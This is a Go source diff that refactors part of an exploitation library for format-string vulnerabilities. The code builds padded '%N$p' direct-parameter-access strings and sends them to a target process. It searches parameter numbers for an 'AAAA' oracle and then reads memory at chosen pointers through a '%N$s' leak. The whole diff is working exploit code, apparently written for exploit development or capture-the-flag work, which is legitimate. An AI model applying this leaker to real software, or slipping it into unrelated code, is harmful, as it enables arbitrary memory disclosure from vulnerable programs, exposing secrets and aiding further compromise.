@@ -45,118 +45,142 @@ func SetupFormatStringLeakViaDPAOrExit(config FormatStringDPAConfig) *FormatStri
 }
 
 func SetupFormatStringLeakViaDPA(config FormatStringDPAConfig) (*FormatStringLeaker, error) {
-	formatString, err := createDPAFormatStringLeakWithLastValueAsArg(config)
+	dpaLeakConfig, err := createDPAFormatStringLeakWithLastValueAsArg(config)
 	if err != nil {
 		return nil, err
 	}
 
-	formatString.info.specifierChar = 's'
-	unpaddedStr := formatString.withoutPadding()
-	finalPaddedFormatStr := prependStringWithCharUntilLen(
-		unpaddedStr,
-		'A',
-		stackAlignedLen(unpaddedStr, config.PointerSize))
-
 	return &FormatStringLeaker{
 		procIOFn:  config.ProcessIOFn,
-		formatStr: finalPaddedFormatStr,
-		info:      formatString.info,
+		builder:   dpaLeakConfig.builder.fmtStrBuilder,
+		formatStr: dpaLeakConfig.builder.build(dpaLeakConfig.paramNum, []byte("s"), dpaLeakConfig.alignLen),
 	}, nil
 }
 
 // In the future, this could be used to setup a write-what-where format
 // string. This function was created by accident (it could have remained
 // a part of the original function).
-func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (*dpaFormatString, error) {
+func createDPAFormatStringLeakWithLastValueAsArg(config FormatStringDPAConfig) (*dpaLeakConfig, error) {
 	err := config.validate()
 	if err != nil {
 		return nil, err
 	}
 
-	formatString := dpaFormatString{
-		paramNumber: 0,
-		info:        formatStringInfo{
-			leakedDataSep:    []byte("|"),
-			specifierChar:    'p',
+	dpaBuilder := dpaFormatStringBuilder{
+		fmtStrBuilder: formatStringBuilder{
+			prefixAndSuffix:  []byte("|"),
 			endOfStringDelim: []byte("foozlefu"),
+			pointerSize:      config.PointerSize,
 		},
 	}
 
-	// The resulting string is going to look like this:
-	//     [padding][format-string-with-loop-index][address]
-	//
-	// The "padding" is required because of the format
-	// string parameter specifier. As it grows, it could
-	// potentially mess up the alignment of the stack,
-	// which will make finding the oracle very difficult.
-	//
-	// Set to max for str len calculation.
-	formatString.paramNumber = config.MaxNumParams
-	fmtStringStackAlignedLen := stackAlignedLen(
-		formatString.withoutPadding(),
-		config.PointerSize)
+	specifier := []byte("p")
+	fmtStrBuff := bytes.NewBuffer(nil)
+	dpaBuilder.buildUnaligned(config.MaxNumParams, specifier, fmtStrBuff)
+	memoryAlignedLen := stringMemoryAlignedLen(fmtStrBuff.Bytes(), config.PointerSize)
 
 	if config.Verbose != nil {
-		config.Verbose.Printf("format string config: %+v\nlen: %d\nstring w/o padding: '%s'",
-			formatString, fmtStringStackAlignedLen, formatString.withoutPadding())
+		config.Verbose.Printf("format string config: %+v\nmemory aligned len: %d\nstring w/o padding: '%s'",
+			dpaBuilder, memoryAlignedLen, fmtStrBuff.Bytes())
 	}
 
 	// TODO: Randomize oracle string instead of A's.
 	oracle := strings.Repeat("A", config.PointerSize)
+	oracleBytes := []byte(oracle)
+
 	// TODO: Some platforms do not include '0x' in the format
 	//  function's output.
 	formattedOracle := []byte(fmt.Sprintf("0x%x", oracle))
 
 	i := 0
 	for ; i < config.MaxNumParams; i++ {
-		formatString.paramNumber = i
-
 		addressFromFormatFunc, err := leakDataWithFormatString(
 			config.ProcessIOFn(),
-			append(formatString.paddedTo(fmtStringStackAlignedLen), oracle...),
-			formatString.info)
+			append(dpaBuilder.build(i, specifier, memoryAlignedLen), oracleBytes...),
+			dpaBuilder.fmtStrBuilder)
 		if err != nil {
 			return nil, err
 		}
 
 		if bytes.Equal(addressFromFormatFunc, formattedOracle) {
-			return &formatString, nil
+			return &dpaLeakConfig{
+				paramNum: i,
+				alignLen: memoryAlignedLen,
+				builder:  dpaBuilder,
+			}, nil
 		}
 	}
 
 	return nil, fmt.Errorf("failed to find leak oracle after %d writes", i)
 }
 
-type dpaFormatString struct {
-	info        formatStringInfo
-	paramNumber int
+type dpaLeakConfig struct {
+	paramNum int
+	alignLen int
+	builder  dpaFormatStringBuilder
 }
 
-type formatStringInfo struct {
-	leakedDataSep    []byte
-	specifierChar    byte
+type dpaFormatStringBuilder struct {
+	fmtStrBuilder formatStringBuilder
+}
+
+// The resulting string is going to look like this:
+//     [padding][format-string-with-loop-index][address]
+//
+// The "padding" is required because of the format
+// string parameter specifier. As it grows, it could
+// potentially mess up the alignment of the stack,
+// which will make finding the oracle very difficult.
+func (o dpaFormatStringBuilder) build(paramNumber int, specifiers []byte, alignmentLen int) []byte {
+	temp := bytes.NewBuffer(nil)
+	o.buildUnaligned(paramNumber, specifiers, temp)
+	return o.fmtStrBuilder.build(alignmentLen, temp)
+}
+
+func (o dpaFormatStringBuilder) buildUnaligned(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
+	o.fmtStrBuilder.appendInitial(buff)
+	o.appendDirectParamAccessSpecifier(paramNumber, specifiers, buff)
+	o.fmtStrBuilder.appendEnd(buff)
+}
+
+func (o dpaFormatStringBuilder) appendDirectParamAccessSpecifier(paramNumber int, specifiers []byte, buff *bytes.Buffer) {
+	buff.WriteByte('%')
+	buff.WriteString(strconv.Itoa(paramNumber))
+	buff.WriteByte('$')
+	if len(specifiers) > 0 {
+		buff.Write(specifiers)
+	}
+}
+
+type formatStringBuilder struct {
+	prefixAndSuffix  []byte
 	endOfStringDelim []byte
+	pointerSize      int
 }
 
-func (o dpaFormatString) paddedTo(finalStrLen int) []byte {
-	return prependStringWithCharUntilLen(o.withoutPadding(), 'A', finalStrLen)
+func (o formatStringBuilder) isSuitableForLeaking() error {
+	if len(o.prefixAndSuffix) == 0 {
+		return fmt.Errorf("prefix and suffix field cannot be empty")
+	}
+	return nil
 }
 
-func (o dpaFormatString) withoutPadding() []byte {
-	buff := bytes.NewBuffer(nil)
-	buff.Write(o.info.leakedDataSep)
-	buff.WriteString("%")
-	buff.WriteString(strconv.Itoa(o.paramNumber))
-	buff.WriteString("$")
-	buff.WriteByte(o.info.specifierChar)
-	buff.Write(o.info.leakedDataSep)
-	buff.Write(o.info.endOfStringDelim)
-	return buff.Bytes()
+func (o formatStringBuilder) build(memAlignmentLen int, unalignedFmtStr *bytes.Buffer) []byte {
+	return prependStringWithCharUntilLen(unalignedFmtStr.Bytes(), 'A', memAlignmentLen)
+}
+
+func (o formatStringBuilder) appendInitial(buff *bytes.Buffer) {
+	buff.Write(o.prefixAndSuffix)
+}
+
+func (o formatStringBuilder) appendEnd(buff *bytes.Buffer) {
+	buff.Write(o.prefixAndSuffix)
+	buff.Write(o.endOfStringDelim)
 }
 
 type FormatStringLeaker struct {
 	formatStr []byte
-	info      formatStringInfo
+	builder   formatStringBuilder
 	procIOFn  func() ProcessIO
 }
 
@@ -173,7 +197,7 @@ func (o FormatStringLeaker) MemoryAtOrExit(pointer Pointer) []byte {
 }
 
 func (o FormatStringLeaker) MemoryAt(pointer Pointer) ([]byte, error) {
-	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.info)
+	return leakDataWithFormatString(o.procIOFn(), append(o.formatStr, pointer...), o.builder)
 }
 
 func NewFormatStringDPALeakerOrExit(config FormatStringDPAConfig) *FormatStringDPALeaker {
@@ -190,36 +214,28 @@ func NewFormatStringDPALeaker(config FormatStringDPAConfig) (*FormatStringDPALea
 		return nil, err
 	}
 
-	formatString := dpaFormatString{
-		info:        formatStringInfo{
-			leakedDataSep:    []byte("|"),
-			specifierChar:    'p',
+	dpaBuilder := dpaFormatStringBuilder{
+		fmtStrBuilder: formatStringBuilder{
+			prefixAndSuffix:  []byte("|"),
 			endOfStringDelim: []byte("foozlefu"),
+			pointerSize:      config.PointerSize,
 		},
-		paramNumber: config.MaxNumParams,
 	}
 
-	// Get the maximum length of the format string, and
-	// calculate the number of bytes required to keep
-	// it aligned on the stack.
-	paddedLen := stackAlignedLen(formatString.withoutPadding(), config.PointerSize)
-	formatString.paramNumber = 0
+	unalignedBuff := bytes.NewBuffer(nil)
+	dpaBuilder.buildUnaligned(config.MaxNumParams, []byte("p"), unalignedBuff)
 
 	return &FormatStringDPALeaker{
-		config:    config,
-		paddedLen: paddedLen,
-		dpaSting:  formatString,
+		config:     config,
+		dpaBuilder: dpaBuilder,
+		alignedLen: stringMemoryAlignedLen(unalignedBuff.Bytes(), config.PointerSize),
 	}, nil
 }
 
 type FormatStringDPALeaker struct {
-	config    FormatStringDPAConfig
-	paddedLen int
-	dpaSting  dpaFormatString
-}
-
-func (o FormatStringDPALeaker) FormatString() []byte {
-	return o.dpaSting.paddedTo(o.paddedLen)
+	config     FormatStringDPAConfig
+	dpaBuilder dpaFormatStringBuilder
+	alignedLen int
 }
 
 func (o FormatStringDPALeaker) FindParamNumberOrExit(target []byte) (int, bool) {
@@ -270,19 +286,20 @@ func (o FormatStringDPALeaker) MemoryAtParam(paramNumber int) ([]byte, error) {
 			paramNumber, o.config.MaxNumParams)
 	}
 
-	o.dpaSting.paramNumber = paramNumber
-	strWithoutPadding := o.dpaSting.withoutPadding()
-
-	stackAlignedStr := prependStringWithCharUntilLen(
-		strWithoutPadding,
-		'A',
-		o.paddedLen)
-
-	return leakDataWithFormatString(o.config.ProcessIOFn(), stackAlignedStr, o.dpaSting.info)
+	return leakDataWithFormatString(o.config.ProcessIOFn(), o.FormatString(paramNumber), o.dpaBuilder.fmtStrBuilder)
 }
 
-func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringInfo) ([]byte, error) {
-	err := process.WriteLine(formatStr)
+func (o FormatStringDPALeaker) FormatString(paramNum int) []byte {
+	return o.dpaBuilder.build(paramNum, []byte{'p'}, o.alignedLen)
+}
+
+func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatStringBuilder) ([]byte, error) {
+	err := info.isSuitableForLeaking()
+	if err != nil {
+		return nil, fmt.Errorf("format string is not suitable for leaking data - %w", err)
+	}
+
+	err = process.WriteLine(formatStr)
 	if err != nil {
 		return nil, fmt.Errorf("failed to write format string to process - %w", err)
 	}
@@ -292,13 +309,13 @@ func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatSt
 		return nil, fmt.Errorf("failed to find end of string delim in process output - %w", err)
 	}
 
-	firstSepIndex := bytes.Index(token, info.leakedDataSep)
+	firstSepIndex := bytes.Index(token, info.prefixAndSuffix)
 	if firstSepIndex == -1 {
 		return nil, fmt.Errorf("returned string does not contain first foramt string separator")
 	}
 
 	lineWithoutFirstSep := token[firstSepIndex+1:]
-	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.leakedDataSep)
+	lastSepIndex := bytes.Index(lineWithoutFirstSep, info.prefixAndSuffix)
 	if lastSepIndex == -1 {
 		return nil, fmt.Errorf("returned string does not contain second foramt string separator")
 	}
@@ -306,7 +323,7 @@ func leakDataWithFormatString(process ProcessIO, formatStr []byte, info formatSt
 	return lineWithoutFirstSep[0:lastSepIndex], nil
 }
 
-func stackAlignedLen(stringWithoutPadding []byte, pointerSizeBytes int) int {
+func stringMemoryAlignedLen(stringWithoutPadding []byte, pointerSizeBytes int) int {
 	maxStringLen := len(stringWithoutPadding)
 	padLen := 0
 	for {
